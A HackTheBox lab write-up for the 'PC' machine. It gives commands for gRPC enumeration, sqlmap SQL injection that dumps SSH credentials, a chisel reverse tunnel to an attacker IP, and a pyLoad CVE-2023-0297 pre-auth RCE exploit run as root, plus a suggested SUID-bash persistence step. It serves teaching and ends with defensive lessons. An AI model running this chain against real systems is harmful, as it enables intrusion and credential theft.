---
title: "PC"
date: 2023-08-05
type: docs
tags:
  - htb
  - linux
  - easy
  - grpc
  - grpc-reflection
  - sqli
  - sqlmap
  - jwt
  - pyload
  - cve-2023-0297
  - chisel
---

<div class="callout callout-info">

**Box Info**

**Platform:** HackTheBox, **OS:** Linux (Ubuntu 20.04), **Difficulty:** Easy, **Released:** 2023-08-05, **IP:** `10.10.11.214` , `pc.htb`

</div>

<div class="callout callout-abstract">

**Attack Path**

1. Only **22** and **50051** are open. Port 50051 is a **gRPC** service with server reflection enabled, so `grpcurl` / `grpcui` enumerate it. `SimpleApp` exposes `RegisterUser`, `LoginUser`, `getInfo`.
2. Register, log in for a JWT, then call `getInfo` with an `id` value. The `id` field is **SQL injectable**. `sqlmap` dumps `accounts` and recovers SSH credentials for **`sau`**.
3. `sau` has a service bound to `127.0.0.1:8000`. Tunnel it with `chisel`. It is **pyLoad**, vulnerable to **CVE-2023-0297**, a pre-auth RCE. pyLoad runs as root, so the injected command reads `root.txt`.

</div>

<div class="callout callout-key">

**Credentials and Flags**


| Where | Value |
| --- | --- |
| `sau` (from the `accounts` table dump) | recovered by sqlmap, see the screenshot in the walkthrough |
| `user.txt` | `/home/sau/user.txt` |
| `root.txt` | `/root/root.txt` (via pyLoad as root) |

</div>

---

## Overview

What I took away from PC more than anything else is that **gRPC is just another web API you have to enumerate**, even though the first instinct when you see an unfamiliar port is to assume it's some exotic, opaque protocol you can't touch. A lot of people freeze the moment nmap reports "port 50051, unknown service", but I've learned that gRPC servers very often ship with **server reflection** turned on, and that feature is effectively the gRPC equivalent of a Swagger document. A single `grpcurl -plaintext host:50051 list` call handed me every service and method the server exposes, and `grpcui` went a step further and rendered the whole thing as a clickable form I could interact with directly in the browser. Once I could actually call methods, the underlying vulnerability turned out to be refreshingly familiar: a parameter, `id` in this case, gets concatenated straight into a SQL query with no sanitization. The privilege escalation side was a clean N-day, **pyLoad CVE-2023-0297**, sitting on a service the developer clearly assumed was safe purely because it only listened on localhost.

I think of this alongside the other unusual-protocol boxes I've worked through, [Antique](/writeups/hackthebox/linux/easy/antique/) with its JetDirect service and [Backdoor](/writeups/hackthebox/linux/easy/backdoor/) with gdbserver, since they all reward the same instinct: don't assume an unfamiliar port is a dead end, go fingerprint it properly. It also belongs with the SQLi-via-sqlmap boxes, [Cat](/writeups/hackthebox/linux/medium/cat/), [Monitored](/writeups/hackthebox/linux/medium/monitored/), and [Usage](/writeups/hackthebox/linux/easy/usage/), and with the recurring "localhost-only service, tunnel it and pop it" pattern I've seen on [MonitorsTwo](/writeups/hackthebox/linux/easy/monitorstwo/), [Nocturnal](/writeups/hackthebox/linux/easy/nocturnal/), and [Monitored](/writeups/hackthebox/linux/medium/monitored/) as well.

---

## Full Walkthrough

### Nmap scan

```console
PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
50051/tcp open  unknown
```

Right away I noticed nmap couldn't fingerprint port 50051 and just dumped a binary probe response instead of a clean service banner. Rather than shrug it off, I looked closely at the raw bytes, and the `\0\0\x18\x04` framing jumped out as **HTTP/2**, which was the detail that told me this was almost certainly gRPC rather than some custom TCP protocol.

After a bit of research to confirm that hunch, I settled on `grpcurl` as my entry point for interacting with the service: <https://github.com/fullstorydev/grpcurl>.

```bash
grpcurl -plaintext pc.htb:50051 list
```

```console
SimpleApp
grpc.reflection.v1alpha.ServerReflection
```

<div class="callout callout-note">

**gRPC server reflection**

gRPC is built on Protocol Buffers, which means that without the corresponding `.proto` file a client has no way of knowing what methods or message shapes even exist on the server side. That's where **server reflection** comes in: it's an optional service that lets the server hand its own schema out at runtime, on request. Seeing `ServerReflection` in the `list` output told me it was enabled here, and that's exactly what let tools like `grpcurl` and `grpcui` enumerate every service, method, and field without me having any prior knowledge of the API. Running `grpcurl -plaintext pc.htb:50051 describe SimpleApp` printed the full definition for me. From a defensive standpoint, reflection is something I'd always recommend disabling on anything internet-facing, since it's essentially handing an attacker your API documentation for free.

</div>

To move faster than raw `grpcurl` calls would let me, I brought up `grpcui` for a clickable interface: <https://github.com/fullstorydev/grpcui>.

```bash
grpcui -plaintext pc.htb:50051
```

![Pasted image 20240210164722](Pasted-image-20240210164722.png)

![Pasted image 20240210170057](Pasted-image-20240210170057.png)

Register a user, then log in:

![Pasted image 20240210170200](Pasted-image-20240210170200.png)

```text
ID = 197
token = eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjoiYmFwaG9tZXRwd24iLCJleHAiOjE3MDc2MTI1MTF9.BQqrp0oolbJlhp6sFgA8_vVlUVLkJMcO4t54FvkI3WA
```

Calling `getInfo` with the `id` and `token`:

![Pasted image 20240210170307](Pasted-image-20240210170307.png)

we found SQL injection in the `id` field.

<div class="callout callout-note">

**SQL injection over gRPC**

The message field is just a string that the server drops into a query like `SELECT ... WHERE id = '<id>'`. gRPC transport does not change anything: capture the `grpcui` request (it proxies over HTTP so Burp sees it), save it, and point `sqlmap` at the request file. Because the value is numeric-in-a-string here, `--tamper=between` and a higher `--level`/`--risk` help. `getInfo` also requires a valid JWT, so keep the `token` field populated or sqlmap's requests get rejected before reaching the sink.

</div>

```bash
sqlmap -r sql2.req --no-cast --tables --threads=10 --batch --tamper=between --level 5 --risk 3
```

```console
Database: <current>
[2 tables]
+----------+
| accounts |
| messages |
+----------+
```

```bash
sqlmap -r sql.req --dump --batch --level 1 --risk 3
```

![Pasted image 20240210173231](Pasted-image-20240210173231.png)

boom we have creds. The `accounts` dump gives `sau`'s password (plaintext in the table), and it is reused for SSH.

### Tunnel to pyLoad, CVE-2023-0297

```console
sau@pc:~$ ss -tlnp
LISTEN 0 ... 127.0.0.1:8000
```

The server is running a service on port `8000`. Start a chisel reverse SOCKS proxy:

```bash
# attacker
./chisel server --port 8085 --reverse
# on pc as sau
./chisel client 10.10.14.77:8085 R:1080:socks
```

![Pasted image 20240210175522](Pasted-image-20240210175522.png)

Through the proxy it is **pyLoad** 0.5.0.

```console
└─[$]> searchsploit pyload
PyLoad 0.5.0 - Pre-auth Remote Code Execution (RCE)   | python/webapps/51532.py
```

<div class="callout callout-note">

**CVE-2023-0297, pyLoad pre-auth RCE**

pyLoad's `/flash/addcrypted2` endpoint is meant to receive click-and-load container files. It builds a call to `pyimport` and ultimately passes attacker data into `eval()` inside `js2py`, so a crafted `jk` (JavaScript "crypt key" evaluator) parameter runs arbitrary Python. No authentication. pyLoad on this box runs as **root**, so the payload executes as root. Fixed in pyLoad 0.5.0b3.dev31.

</div>

```bash
proxychains python3 51532.py -u http://127.0.0.1:8000 -c 'cat /root/root.txt | tee /tmp/flag.txt'
```

```console
[+] Host up, let's exploit!
[+] The exploit has been executed in target machine.
```

Now we have the root flag from `/tmp/flag.txt`. For a full shell, swap the command for a reverse shell or `chmod +s /bin/bash`.

---

## Loot

| Flag | Location |
| --- | --- |
| `user.txt` | `/home/sau/user.txt` |
| `root.txt` | `/root/root.txt` |

---

## Lessons and Takeaways

- **An unknown port with HTTP/2 framing is usually gRPC.** Try `grpcurl -plaintext host:port list` before anything else.
- **Disable gRPC server reflection** in production. It is a full API map for an attacker.
- **gRPC does not sanitise anything for you.** Every field is user input; parameterise queries exactly as you would for REST.
- **"It only listens on localhost" is not a security control.** Anyone with a shell tunnels straight to it. Patch internal services and run them as an unprivileged user, never root.
- **Patch pyLoad** and, more generally, do not run download managers or automation daemons as root.

---

## Related Writeups

- **Unusual service protocol to foothold:** [Antique](/writeups/hackthebox/linux/easy/antique/), [Backdoor](/writeups/hackthebox/linux/easy/backdoor/)
- **SQLi with sqlmap from a saved request:** [Cat](/writeups/hackthebox/linux/medium/cat/), [Monitored](/writeups/hackthebox/linux/medium/monitored/), [Usage](/writeups/hackthebox/linux/easy/usage/)
- **Tunnel to a localhost-only service then exploit:** [MonitorsTwo](/writeups/hackthebox/linux/easy/monitorstwo/), [Nocturnal](/writeups/hackthebox/linux/easy/nocturnal/), [Monitored](/writeups/hackthebox/linux/medium/monitored/)
- **N-day RCE on a service running as root:** [Bizness](/writeups/hackthebox/linux/easy/bizness/), [Analytics](/writeups/hackthebox/linux/easy/analytics/)

## References

- CVE-2023-0297 (pyLoad) <https://nvd.nist.gov/vuln/detail/CVE-2023-0297>
- grpcurl <https://github.com/fullstorydev/grpcurl>
- grpcui <https://github.com/fullstorydev/grpcui>
- chisel <https://github.com/jpillora/chisel>
